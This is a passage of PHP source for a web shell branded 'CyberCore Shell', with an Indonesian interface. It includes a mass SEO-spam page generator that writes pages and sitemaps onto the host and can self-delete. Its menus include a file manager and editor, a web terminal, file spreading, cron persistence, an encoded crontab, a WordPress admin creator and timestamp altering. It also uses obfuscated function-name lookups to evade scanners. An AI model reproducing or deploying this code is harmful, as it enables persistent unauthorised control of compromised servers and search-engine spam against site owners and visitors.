name="tiers[X][img]" class="w-full" required></div></div></template>
            <script>if(typeof gen_c==='undefined'){var gen_c=0}function addTier(){let t=document.getElementById('tier-template');if(t){document.getElementById('content-tiers-container').insertAdjacentHTML('beforeend',t.innerHTML.replace(/\[X\]/g,`[${gen_c++}]`))}}function toggleTunnelInput(s){let e=document.getElementById('tunnel_param_wrapper');if(e)e.style.display=s?'block':'none'}if(document.readyState==='loading'){document.addEventListener('DOMContentLoaded',function(){let c=document.getElementById('content-tiers-container');if(c&&!c.hasChildNodes())addTier()})}else{let c=document.getElementById('content-tiers-container');if(c&&!c.hasChildNodes())addTier()}</script>
        </section>
        <?php
    }

    function generator_display_results($data) {
        global $htmlspecialchars_fn;
        extract($data);
        ?>
        <section class="content-section cyber-panel p-4">
            <h1 class="cyber-font cyber-glow text-xl mb-4">Hasil Proses Generator</h1>
            <?php if (isset($test_mode) && $test_mode): ?>
                <div class="message info"><h2>Mode Uji Coba</h2><p><strong>Keyword:</strong> <code><?php echo call_user_func($htmlspecialchars_fn, $processed_keyword ?? 'N/A'); ?></code></p><p><strong>Hasil HTML:</strong></p><textarea readonly class="w-full h-96"><?php echo call_user_func($htmlspecialchars_fn, $test_output ?? ''); ?></textarea></div>
            <?php else: ?>
                <div class="message info"><p>Mode: <strong><?php echo strtoupper(call_user_func($htmlspecialchars_fn, $mode ?? 'N/A')); ?></strong> | Waktu: <strong><?php echo date('Y-m-d H:i:s'); ?></strong></p><p>Eksekusi: <strong><?php echo $executionTime ?? 0; ?> detik</strong> | Diproses: <strong><?php echo $totalItems ?? 0; ?></strong> | Dibuat: <strong><?php echo $createdCount ?? 0; ?></strong></p></div>
            <?php endif; ?>
            <?php if (!empty($errorMessages)): ?>
                <div class="message error"><h2>Kesalahan:</h2><ul><?php foreach ($errorMessages as $e): ?><li><?php echo call_user_func($htmlspecialchars_fn, $e); ?></li><?php endforeach; ?></ul></div>
            <?php endif; ?>
            <?php if (empty($test_mode)): ?>
                <?php if (!empty($sitemapGenerated)): ?>
                    <div class="message success"><p><?php echo $sitemapMessage; ?></p><p><a href="<?php echo call_user_func($htmlspecialchars_fn, $sitemapUrl); ?>" target="_blank"><?php echo call_user_func($htmlspecialchars_fn, $sitemapUrl); ?></a></p></div>
                <?php endif; ?>
                <?php if (!empty($urlBuffer)): ?>
                    <div class="mt-4"><h2>Hasil URL:</h2><ul class="max-h-60 overflow-y-auto border border-gray-600 p-2 mt-2"><?php foreach ($urlBuffer as $u): ?><li><a href="<?php echo call_user_func($htmlspecialchars_fn, $u); ?>" target="_blank"><?php echo call_user_func($htmlspecialchars_fn, $u); ?></a></li><?php endforeach; ?></ul></div>
                <?php endif; ?>
            <?php endif; ?>
            <div class="mt-6"><a href="?menu=generator" class="cyber-btn cyber-btn-primary">« Kembali ke Generator</a></div>
        </section>
        <?php
    }

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'run_generator') {
        $sitemapFilename = 'sitemap.xml';
        $kw_url = trim($_POST['kw_url'] ?? ''); $template_url = trim($_POST['template_url'] ?? ''); $baseAMPUrl = trim($_POST['base_amp_url'] ?? ''); $slug_structure = $_POST['slug_structure'] ?? 'dir'; $tunnel_param_name = trim($_POST['tunnel_param_name'] ?? 'id'); $mode_gen = $_POST['mode'] ?? 'dir'; $tiers = $_POST['tiers'] ?? []; $test_mode = isset($_POST['test_mode']); $auto_delete_gen = isset($_POST['auto_delete']);
        $gen_errorMessages = [];
        if (!function_exists('curl_init')) $gen_errorMessages[] = "cURL tidak aktif."; if (empty($kw_url) || empty($template_url) || empty($tiers)) $gen_errorMessages[] = "Sumber data & tingkatan konten wajib diisi."; if (!is_writable('.')) $gen_errorMessages[] = "Direktori tidak writable.";
        if (!empty($gen_errorMessages)) { generator_display_results(['errorMessages' => $gen_errorMessages]); return; }
        $kw_result = generator_fetch_url_with_curl($kw_url); if ($kw_result['error']) $gen_errorMessages[] = $kw_result['error'];
        $template_result = generator_fetch_url_with_curl($template_url); if ($template_result['error']) $gen_errorMessages[] = $template_result['error'];
        if (!empty($gen_errorMessages)) { generator_display_results(['errorMessages' => $gen_errorMessages]); return; }
        $lines = array_filter(array_map('trim', preg_split('/\R/', strip_tags($kw_result['content']))));
        if (empty($lines)) $gen_errorMessages[] = "Tidak ada keyword valid.";
        $startTime = microtime(true); $urlBuffer = []; $createdCount = 0; $sitemapGenerated = false; $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http'; $host = $_SERVER['HTTP_HOST']; $basePath = rtrim(dirname($_SERVER['PHP_SELF']), '/'); $baseUrl = $protocol . '://' . $host . $basePath;
        usort($tiers, function($a, $b) {
            $limit_a = !empty($a['limit']) ? (int)$a['limit'] : PHP_INT_MAX;
            $limit_b = !empty($b['limit']) ? (int)$b['limit'] : PHP_INT_MAX;
            return $limit_a <=> $limit_b;
        });
        if (empty($gen_errorMessages)) {
            $itemsToProcess = $test_mode ? array_slice($lines, 0, 1) : $lines;
            foreach ($itemsToProcess as $index => $originalKeyword) {
                if (empty($originalKeyword)) continue;
                $tier = end($tiers); foreach ($tiers as $t) { if (empty($t['limit']) || ($index + 1) <= (int)$t['limit']) { $tier = $t; break; } }
                $sanitized_name = generator_sanitizeFilename($originalKeyword); $urlPath = ($mode_gen === 'file') ? "$baseUrl/$sanitized_name.html" : rtrim("$baseUrl/$sanitized_name", '/') . '/';
                $brand_slug = ''; switch ($slug_structure) { case 'html':$brand_slug = rtrim($baseAMPUrl, '/') . '/' . $sanitized_name . '.html';break; case 'dir':$brand_slug = rtrim($baseAMPUrl, '/') . '/' . $sanitized_name . '/';break; case 'tunnel':$tb = $baseAMPUrl;if (strpos($tb, '?') === false && substr($tb, -1) !== '/') {$tb .= '/';}$c = (strpos($tb, '?') === false) ? '?' : '&';$brand_slug = $tb . $c . $tunnel_param_name . '=' . urlencode(strtoupper($originalKeyword));break;}
                $external_domains = []; if (!empty($tier['external_domains'])) {$external_domains = array_filter(array_map('trim', preg_split('/\R/', $tier['external_domains'])));}
                $template_data = ['JUDUL' => generator_spin(str_replace('{{BRAND}}', strtoupper($originalKeyword), $tier['title'])),'DESKRIPSI' => generator_spin(str_replace('{{BRAND}}', strtoupper($originalKeyword), $tier['desc'])),'GAMBAR' => $tier['img'],'ARTIKEL' => generator_generate_article_content($tier['article'], $originalKeyword, $lines, $urlPath, $external_domains, $mode_gen),'KEYWORD_ASLI' => call_user_func($GLOBALS['htmlspecialchars_fn'], $originalKeyword),'BRAND' => strtoupper($originalKeyword),'smallBrand' => strtolower($originalKeyword),'brand_slug' => $brand_slug,'URL_CANONICAL' => $urlPath];
                $html_content = generator_render_template($template_result['content'], $template_data);
                if ($test_mode) { generator_display_results(['test_mode' => true, 'processed_keyword' => $originalKeyword, 'test_output' => $html_content]); return; }
                try {
                    $targetPath = ($mode_gen === 'file') ? "$sanitized_name.html" : "$sanitized_name/index.html"; if ($mode_gen === 'dir' && !is_dir($sanitized_name)) @mkdir($sanitized_name, 0755, true); if (@file_put_contents($targetPath, $html_content) === false) throw new Exception("Gagal menulis file.");
                    $urlBuffer[] = $urlPath; $createdCount++;
                } catch (Exception $e) { $gen_errorMessages[] = "Error pada '$originalKeyword': " . $e->getMessage(); }
            }
        }
        $sitemapMessage = ''; $sitemapUrl = '';
        if (!empty($urlBuffer)) {
            $finalSitemapFilename = $sitemapFilename; $sitemapMessage = "Sitemap <code>$finalSitemapFilename</code> diperbarui:";
            if (file_exists($sitemapFilename)) {$timestamp = date('Y-m-d_His');$path_parts = pathinfo($sitemapFilename);$finalSitemapFilename = $path_parts['filename'] . '-' . $timestamp . '.' . $path_parts['extension'];$sitemapMessage = "Sitemap baru <code>$finalSitemapFilename</code> dibuat:";}
            $sitemapUrl = $baseUrl . '/' . $finalSitemapFilename; $sitemapXml = '<?xml version="1.0" encoding="UTF-8"?><urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">';
            foreach ($urlBuffer as $url) $sitemapXml .= '<url><loc>' . call_user_func($GLOBALS['htmlspecialchars_fn'], $url) . '</loc><lastmod>' . date('c') . '</lastmod></url>'; $sitemapXml .= '</urlset>';
            if (@file_put_contents($finalSitemapFilename, $sitemapXml)) $sitemapGenerated = true; else $gen_errorMessages[] = "Gagal menulis sitemap: " . $finalSitemapFilename;
        }
        generator_display_results(['mode' => $mode_gen,'executionTime' => round(microtime(true) - $startTime, 2),'createdCount' => $createdCount,'totalItems' => count($lines),'urlBuffer' => $urlBuffer,'errorMessages' => $gen_errorMessages,'sitemapGenerated' => $sitemapGenerated ?? false,'sitemapUrl' => $sitemapUrl,'sitemapMessage' => $sitemapMessage,]);
        if ($auto_delete_gen && $createdCount > 0 && empty($gen_errorMessages)) @unlink(__FILE__);
        return;
    }
    
    generator_display_main_form();
}

ob_start();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <title>CyberCore Shell [<?= $htmlspecialchars_fn($_SERVER['SERVER_NAME']); ?>]</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/theme/ayu-mirage.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/php/php.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/xml/xml.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/javascript/javascript.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/css/css.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/htmlmixed/htmlmixed.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Roboto+Mono:wght@400;700&display=swap');
        :root {
            --primary: #0f172a; --secondary: #020617; --accent: #00f0ff; --accent-hover: #7dfffd;
            --text: #e2e8f0; --highlight: #f0f; --danger: #ff2a6d; --success: #05f778; --warning: #f7b733;
        }
        body { font-family: 'Roboto Mono', monospace; background-color: var(--secondary); color: var(--text); background-image: linear-gradient(rgba(0, 240, 255, 0.05) 1px, transparent 1px), linear-gradient(90deg, rgba(255, 0, 255, 0.05) 1px, transparent 1px); background-size: 25px 25px; }
        .cyber-font { font-family: 'Orbitron', sans-serif; }
        .glass-effect { background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px); border: 1px solid rgba(0, 240, 255, 0.2); }
        .cyber-panel { position: relative; border: 1px solid rgba(0, 240, 255, 0.3); background: rgba(15, 23, 42, 0.5); box-shadow: 0 0 15px rgba(0, 240, 255, 0.15), inset 0 0 8px rgba(255, 0, 255, 0.1); }
        .sidebar { background: linear-gradient(145deg, rgba(15, 23, 42, 0.95) 0%, rgba(2, 6, 23, 0.98) 100%); }
        .nav-link.active { background: rgba(0, 240, 255, 0.2); border-left: 3px solid var(--accent); color: var(--accent); }
        .nav-link:hover { background: rgba(0, 240, 255, 0.1); border-left: 3px solid var(--accent); color: var(--accent-hover); }
        .cyber-glow { text-shadow: 0 0 6px var(--accent), 0 0 12px var(--accent); }
        .cyber-glow-danger { text-shadow: 0 0 6px var(--danger), 0 0 12px var(--danger); }
        .cyber-glow-success { text-shadow: 0 0 6px var(--success), 0 0 12px var(--success); }
        .cyber-btn { position: relative; overflow: hidden; transition: all 0.3s; border: 1px solid; padding: 6px 12px; font-size: 0.9em; border-radius: 4px; }
        .cyber-btn-primary { border-color: var(--accent); color: var(--accent) !important; background: transparent; }
        .cyber-btn-primary:hover { background: rgba(0, 240, 255, 0.2); color: white !important; box-shadow: 0 0 10px var(--accent); }
        .message { padding: 15px; margin-bottom: 20px; border-left-width: 4px; border-left-style: solid; }
        .message.success { background-color: rgba(5, 247, 120, 0.1); color: var(--success); border-left-color: var(--success); }
        .message.error { background-color: rgba(255, 42, 109, 0.1); color: var(--danger); border-left-color: var(--danger); }
        .message.info { background-color: rgba(0, 240, 255, 0.1); color: var(--accent); border-left-color: var(--accent); }
        .file-explorer table { width: 100%; border-collapse: collapse; }
        .file-explorer th, .file-explorer td { border: 1px solid rgba(0, 240, 255, 0.2); padding: 8px; text-align: left; }
        .file-explorer th { background-color: rgba(0, 240, 255, 0.1); color: var(--accent); }
        
        .file-explorer td:nth-child(2) a { 
            color: var(--accent-hover);
            text-decoration: none;
        }
        .file-explorer td:nth-child(2) a:hover {
            text-decoration: underline;
            color: white;
        }
        .file-explorer td:nth-child(4) a { 
            text-decoration: none;
        }
        .file-explorer td:nth-child(4) a.perm-writable { color: var(--success); }
        .file-explorer td:nth-child(4) a.perm-readable-only { color: var(--warning); }
        .file-explorer td:nth-child(4) a.perm-unreadable { color: var(--danger); }
        .file-explorer td:nth-child(4) a:hover {
            text-decoration: underline;
            filter: brightness(1.2); 
        }

        .action-btn { display: inline-block; padding: 4px 8px; border: 1px solid rgba(255,255,255,0.3); margin: 2px; text-decoration: none; font-size: 0.8em; }
        .action-btn:hover { background: var(--accent); color: var(--secondary); border-color: var(--accent); text-decoration:none; }
        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0,0,0,0.7); backdrop-filter: blur(5px); }
        .modal-content { background-color: var(--primary); margin: 10% auto; padding: 20px; border: 1px solid var(--accent); width: 80%; max-width: 600px; box-shadow: 0 0 25px rgba(0, 240, 255, 0.4); }
        input, textarea, select { background-color: rgba(2, 6, 23, 0.7); border: 1px solid rgba(0, 240, 255, 0.4); color: var(--text); padding: 8px; border-radius: 4px; }
        input:focus, textarea:focus { outline: none; border-color: var(--accent-hover); box-shadow: 0 0 8px var(--accent); }
        .terminal-body { background-color: #1e1e1e; font-family:'Consolas',monospace; height: calc(100vh - 200px); display: flex; flex-direction: column; }
        .terminal-display { flex-grow: 1; overflow-y: auto; padding: 10px; background-color:#252526; border:1px solid #444; }
        .prompt{color:#4ec9b0} .command{color:#dcdcaa} .output{color:#ccc} #cmd_input{background:0 0;color:#d4d4d4}
        .CodeMirror { height: 60vh; font-family: 'Roboto Mono', monospace !important; font-size: 14px; background: rgba(2, 6, 23, 0.8) !important; border: 1px solid rgba(0, 240, 255, 0.3); }
        fieldset { border: 1px solid rgba(0, 240, 255, 0.3); padding: 1rem; margin-bottom: 1rem; }
        legend { padding: 0 0.5rem; color: var(--accent); font-family: 'Orbitron'; }
    </style>
</head>
<body class="text-sm">
    <div class="flex h-screen overflow-hidden">
        <aside class="sidebar w-64 flex-shrink-0 glass-effect h-full fixed left-0 top-0 overflow-y-auto cyber-border p-4">
            <div class="flex items-center mb-6">
                <i class="fas fa-ghost text-accent text-2xl mr-2 cyber-glow" style="color:var(--accent);"></i>
                <h1 class="text-xl font-bold cyber-font">CyberCore<span class="cyber-glow">Shell</span></h1>
            </div>
            
            <h3 class="text-xs uppercase tracking-wider text-gray-400 mb-2 px-2 cyber-font">Main Tools</h3>
            <ul>
                <?php
                $menus = [
                    'explorer' => ['name' => 'File Explorer', 'icon' => 'fa-folder-open'],
                    'terminal' => ['name' => 'Web Terminal', 'icon' => 'fa-terminal'],
                    'process_manager' => ['name' => 'Process Manager', 'icon' => 'fa-microchip'],
                    'generator' => ['name' => 'Content Generator', 'icon' => 'fa-cogs'],
                    'file_spreader' => ['name' => 'Sebar File', 'icon' => 'fa-satellite-dish'],
                    'adminer' => ['name' => 'Adminer', 'icon' => 'fa-database'],
                ];
                foreach ($menus as $key => $menu_data) {
                    $is_active = ($active_menu === $key || ($key === 'explorer' && $active_menu === 'editor'));
                    echo '<li><a href="?menu=' . $key . '&path=' . urlencode($current_path) . '" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1 ' . ($is_active ? 'active' : '') . '"><i class="fas ' . $menu_data['icon'] . ' mr-3 w-4 text-center" style="color:var(--accent);"></i><span>' . $menu_data['name'] . '</span></a></li>';
                }
                ?>
            </ul>
             <h3 class="text-xs uppercase tracking-wider text-gray-400 mb-2 mt-4 px-2 cyber-font">Security &amp; Persistence</h3>
             <ul>
                 <?php
                 $sec_menus = [
                    'security_config' => ['name' => 'Security Config', 'icon' => 'fa-user-shield'],
                    'webshell_scanner' => ['name' => 'Webshell Scanner', 'icon' => 'fa-shield-virus'],
                    'dynamic_cache_manager' => ['name' => $dynamic_names['menu_title'], 'icon' => 'fa-hdd'],
                    'suid_scanner' => ['name' => 'SUID Scanner', 'icon' => 'fa-search'],
                    'disabled_functions' => ['name' => 'Disabled Functions', 'icon' => 'fa-ban'],
                    'destroyer' => ['name' => 'Backdoor Destroyer', 'icon' => 'fa-skull-crossbones'],
                    'cron' => ['name' => 'Cron Job Setup', 'icon' => 'fa-clock'],
                    'view_crontab' => ['name' => 'View Encoded Crontab', 'icon' => 'fa-eye-slash'],
                    'wp_admin_creator' => ['name' => 'WP Admin Creator', 'icon' => 'fa-wordpress'],
                 ];
                 foreach ($sec_menus as $key => $menu_data) {
                    $is_active = ($active_menu === $key);
                    echo '<li><a href="?menu=' . $key . '&path=' . urlencode($current_path) . '" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1 ' . ($is_active ? 'active' : '') . '"><i class="fas ' . $menu_data['icon'] . ' mr-3 w-4 text-center" style="color:var(--accent);"></i><span>' . $menu_data['name'] . '</span></a></li>';
                 }
                 ?>
             </ul>
             <h3 class="text-xs uppercase tracking-wider text-gray-400 mb-2 mt-4 px-2 cyber-font">Self Actions</h3>
             <ul>
                 <li><a href="?menu=explorer&file_action=lock&self=1&target=<?= urlencode(basename(__FILE__)) ?>&path=<?= urlencode(dirname(__FILE__)) ?>" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1" onclick="return confirm('Yakin ingin mengunci shell ini?')"><i class="fas fa-lock mr-3 w-4 text-center" style="color:var(--danger);"></i><span>Lock This Shell</span></a></li>
                 <li><a href="?menu=explorer&file_action=unlock" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1" onclick="return confirm('Yakin ingin membuka semua kunci? Ini akan menghentikan semua proses PHP background.')"><i class="fas fa-unlock mr-3 w-4 text-center" style="color:var(--success);"></i><span>Unlock All</span></a></li>
                 <?php if(isset($_SESSION['shell_authenticated']) && $_SESSION['shell_authenticated'] === true): ?>
                 <li><a href="?logout=1" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1"><i class="fas fa-sign-out-alt mr-3 w-4 text-center" style="color:var(--warning);"></i><span>Logout</span></a></li>
                 <?php endif; ?>
             </ul>
        </aside>

        <main class="main-content flex-1 overflow-auto ml-64">
            <div class="p-6">
                <header class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4 mb-6">
                    <div class="info-card rounded-lg p-3 glass-effect"><span class="cyber-font text-accent">Server:</span><br><?= $htmlspecialchars_fn(function_exists('php_uname') ? php_uname('n') : 'N/A'); ?></div>
                    <div class="info-card rounded-lg p-3 glass-effect"><span class="cyber-font text-accent">OS / Arch:</span><br><?= $htmlspecialchars_fn(function_exists('php_uname') ? php_uname('s').' / '.php_uname('m') : 'N/A'); ?></div>
                    <div class="info-card rounded-lg p-3 glass-effect"><span class="cyber-font text-accent">Server IP:</span><br><?= $htmlspecialchars_fn(isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : (isset($_SERVER['LOCAL_ADDR']) ? $_SERVER['LOCAL_ADDR'] : 'N/A')); ?></div>
                    <div class="info-card rounded-lg p-3 glass-effect"><span class="cyber-font text-accent">Your IP:</span><br><?= $htmlspecialchars_fn($_SERVER['REMOTE_ADDR']); ?></div>
                </header>

                <?php if ($active_menu === 'explorer' || $active_menu === 'editor'): ?>
                <div class="cyber-panel p-4 mb-6">
                    <div class="flex flex-wrap items-center gap-4">
                        <a href="?menu=explorer&path=<?= urlencode($auto_path_script); ?>" class="cyber-btn cyber-btn-primary"><i class="fas fa-home mr-2"></i>Home Shell</a>
                        <button id="create-file-btn" class="cyber-btn cyber-btn-primary"><i class="fas fa-file-plus mr-2"></i>Buat File</button>
                        <button id="create-folder-btn" class="cyber-btn cyber-btn-primary"><i class="fas fa-folder-plus mr-2"></i>Buat Folder</button>
                        <form class="flex items-center gap-2" method="post" action="<?= $htmlspecialchars_fn($_SERVER['REQUEST_URI']); ?>" enctype="multipart/form-data">
                            <input type="hidden" name="action" value="upload_file">
                            <label for="file-upload-input" class="cyber-btn cyber-btn-primary cursor-pointer"><i class="fas fa-upload mr-2"></i>Browse...</label>
                            <input id="file-upload-input" type="file" name="uploaded_files[]" required class="hidden" multiple>
                            <span id="file-upload-filename" class="text-gray-400 max-w-xs truncate">No file selected.</span>
                            <button type="submit" class="cyber-btn cyber-btn-primary">UPLOAD</button>
                        </form>
                    </div>
                </div>
                <?php endif; ?>

                <div class="dynamic-content">
                    <?php
                    if (!empty($output_messages)) { echo "<div class='message success'>" . implode("<br>", $output_messages) . "</div>"; }
                    if (!empty($error_messages)) { echo "<div class='message error'>" . implode("<br>", $error_messages) . "</div>"; }
                    
                    if ($active_menu === 'explorer' || $active_menu === 'editor' || empty($active_menu)) {
                        if ($active_menu === 'editor' && isset($_GET['target'])) {
                            $file_to_edit_basename = call_user_func($basename_fn, $_GET['target']); 
                            $file_to_edit_path = rtrim($current_path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $file_to_edit_basename; 
                            $file_content = ''; 
                            $can_edit = false; 
                            $error_edit_page = ''; 
                            $file_exists_fn_local = _get_fn_name_global_init_v3('_g_ascii_file_exists','file_exists');
                            $file_get_contents_fn_local = _get_fn_name_global_init_v3('_g_ascii_file_get_contents', 'file_get_contents');
                            $is_readable_fn_local = _get_fn_name_global_init_v3('_g_ascii_is_readable', 'is_readable');
                            $is_writable_fn_local = _get_fn_name_global_init_v3('_g_ascii_is_writable', 'is_writable');

                            if (call_user_func($file_exists_fn_local, $file_to_edit_path) && !@call_user_func($is_dir_fn, $file_to_edit_path)) {
                                if (call_user_func($is_readable_fn_local, $file_to_edit_path)) {
                                    $file_content_raw = @call_user_func($file_get_contents_fn_local, $file_to_edit_path);
                                    if ($file_content_raw === false) {
                                        $error_edit_page = "Gagal membaca konten file.";
                                    } else {
                                        $file_content = $file_content_raw;
                                    }
                                    $can_edit = call_user_func($is_writable_fn_local, $file_to_edit_path);
                                } else { $error_edit_page = "File tidak readable."; }
                            } else { $error_edit_page = "File tidak ditemukan atau adalah direktori."; }
                            ?>
                            <section class="cyber-panel p-4">
                                <h1 class="cyber-font cyber-glow text-xl mb-4">EDIT FILE: <?= $htmlspecialchars_fn($file_to_edit_basename); ?></h1>
                                <?php if (!empty($error_edit_page)): ?> <p class="message error"><?= $htmlspecialchars_fn($error_edit_page); ?></p>
                                <?php else: ?>
                                <form method="post" action="<?= $htmlspecialchars_fn($_SERVER['PHP_SELF']); ?>?menu=editor&path=<?= urlencode($current_path); ?>&target=<?= urlencode($file_to_edit_basename); ?>">
                                    <input type="hidden" name="action" value="save_file_content">
                                    <input type="hidden" name="file_to_edit_path" value="<?= $htmlspecialchars_fn($file_to_edit_path); ?>">
                                    <textarea id="code-editor" name="file_content" <?php if (!$can_edit) echo 'readonly'; ?>><?= $htmlspecialchars_fn($file_content); ?></textarea>
                                    <div class="mt-4">
                                    <?php if ($can_edit): ?> <button type="submit" name="save_file_content" class="cyber-btn cyber-btn-primary">SAVE CHANGES</button> <?php else: ?> <p class="message error"><em>File is not writable.</em></p> <?php endif; ?>
                                    </div>
                                </form><?php endif; ?>
                                <p class="mt-4"><a href="?menu=explorer&path=<?= urlencode($current_path); ?>">&laquo; Back to File Explorer</a></p>
                            </section> <?php
                        } else {
                            ?> <section class="cyber-panel p-4 file-explorer">
                                <h1 class="cyber-font cyber-glow text-xl mb-4">FILE EXPLORER</h1>
                                <div class="path-breadcrumb mb-4 flex items-center flex-wrap text-lg">
                                    <?php
                                    $path_parts = explode(DIRECTORY_SEPARATOR, $current_path);
                                    $path_so_far = '';
                                    $is_windows_drive = false;

                                    if (DIRECTORY_SEPARATOR === '\\' && count($path_parts) > 0 && preg_match('/^[A-Za-z]:$/', $path_parts[0])) {
                                        $is_windows_drive = true;
                                        $path_so_far = $path_parts[0] . '\\';
                                        echo '<a href="?menu=explorer&path='.urlencode($path_so_far).'"><i class="fas fa-hdd mr-1"></i>'.$htmlspecialchars_fn($path_parts[0]).'</a>';
                                        array_shift($path_parts);
                                    } elseif (DIRECTORY_SEPARATOR === '/') {
                                        if (empty($path_parts[0]) && isset($path_parts[1])) {
                                            array_shift($path_parts);
                                        }
                                        $path_so_far = '/';
                                        if (is_path_allowed_by_basedir($path_so_far)) {
                                            echo '<a href="?menu=explorer&path='.urlencode($path_so_far).'"><i class="fas fa-hdd"></i></a>';
                                        } else {
                                            echo '<span><i class="fas fa-hdd"></i></span>';
                                        }
                                    }
                                    
                                    foreach ($path_parts as $part) {
                                        if (empty($part)) continue;
                                        $path_so_far = rtrim($path_so_far, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $part;
                                        echo '<span class="mx-2 text-gray-500">/</span>';
                                        if (is_path_allowed_by_basedir($path_so_far)) {
                                            echo '<a href="?menu=explorer&path='.urlencode($path_so_far).'" class="hover:text-white">'.$htmlspecialchars_fn($part).'</a>';
                                        } else {
                                            echo '<span class="text-gray-500">'.$htmlspecialchars_fn($part).'</span>';
                                        }
                                    }
                                    ?>
                                </div>
                                <form method="post" action="?menu=explorer&path=<?= urlencode($current_path); ?>" id="bulk-action-form">
                                <input type="hidden" name="action" value="bulk_action">
                                <table><thead><tr><th><input type="checkbox" id="select-all-checkbox"></th><th>Name</th><th>Size</th><th>Perms</th><th>Owner/Group</th><th>Modified</th><th class="actions-col">Actions</th></tr></thead><tbody>
                                <?php 
                                $real_current_path_fe = (call_user_func($GLOBALS['function_exists_fn'], $GLOBALS['realpath_fn']) ? @call_user_func($GLOBALS['realpath_fn'], $current_path) : $current_path); 
                                $parent_dir_fe = call_user_func($GLOBALS['dirname_fn'], $current_path);
                                $real_parent_dir_fe = (call_user_func($GLOBALS['function_exists_fn'], $GLOBALS['realpath_fn']) ? @call_user_func($GLOBALS['realpath_fn'], $parent_dir_fe) : $parent_dir_fe); 

                                if ($real_current_path_fe && $real_parent_dir_fe && $real_current_path_fe !== $real_parent_dir_fe && $parent_dir_fe !== $current_path && is_path_allowed_by_basedir($parent_dir_fe)) { 
                                    echo '<tr><td></td><td><a href="?menu=explorer&path=' . urlencode($parent_dir_fe) . '" class="dir-link"><i class="fas fa-level-up-alt mr-2"></i>..</a></td><td colspan="5"></td></tr>'; 
                                }
                                $items_fe = listDirectory($current_path); 
                                $all_items = array_merge($items_fe['dirs'], $items_fe['files']); 
                                foreach ($all_items as $item) {
                                    $is_readable_perm_check_fn = _get_fn_name_global_init_v3('_g_ascii_is_readable', 'is_readable');
                                    $is_writable_perm_check_fn = _get_fn_name_global_init_v3('_g_ascii_is_writable', 'is_writable');
                                    
                                    $is_readable_perm = @call_user_func($is_readable_perm_check_fn, $item['path']);
                                    $is_writable_perm = @call_user_func($is_writable_perm_check_fn, $item['path']);
                                    
                                    $perm_color_class = 'perm-unreadable'; 
                                    if ($is_writable_perm) {
                                        $perm_color_class = 'perm-writable'; 
                                    } elseif ($is_readable_perm) {
                                        $perm_color_class = 'perm-readable-only'; 
                                    }

                                    echo '<tr><td class="checkbox-col"><input type="checkbox" name="selected_items[]" value="' . $item['raw_name'] . '" class="item-checkbox"></td>'; if ($item['type'] === 'dir') { echo '<td><a href="?menu=explorer&path=' . urlencode($item['path']) .'" class="dir-link"><i class="fas fa-folder mr-2 text-yellow-400"></i>' . $item['name'] . '</a></td>'; } else { echo '<td><a href="?menu=explorer&file_action=edit&path='.urlencode($current_path).'&target=' . urlencode($item['raw_name']) . '"><i class="fas fa-file-alt mr-2 text-gray-300"></i>' . $item['name'] . '</a></td>'; } 
                                    echo '<td>' . $item['size'] . '</td>'; 
                                    echo '<td><a href="#" onclick="changePerms(\'' . urlencode($item['raw_name']) . '\', \'' . substr(sprintf('%o', @fileperms($item['path'])), -4) . '\')" class="' . $perm_color_class . '">' . $item['perms'] . '</a></td>';
                                    echo '<td>' . $item['owner'] . '/' . $item['group'] . '</td>'; 
                                    echo '<td><a href="#" onclick="changeMtime(\''.urlencode($item['raw_name']).'\', \''.$item['modified'].'\')">'.$item['modified'].'</a></td>'; 
                                    echo '<td class="actions-col">'; if ($item['type'] === 'file') { echo '<a href="?menu=explorer&path=' . urlencode($current_path) . '&file_action=edit&target=' . urlencode($item['raw_name']) . '" class="action-btn" title="Edit"><i class="fas fa-edit"></i></a> '; } 
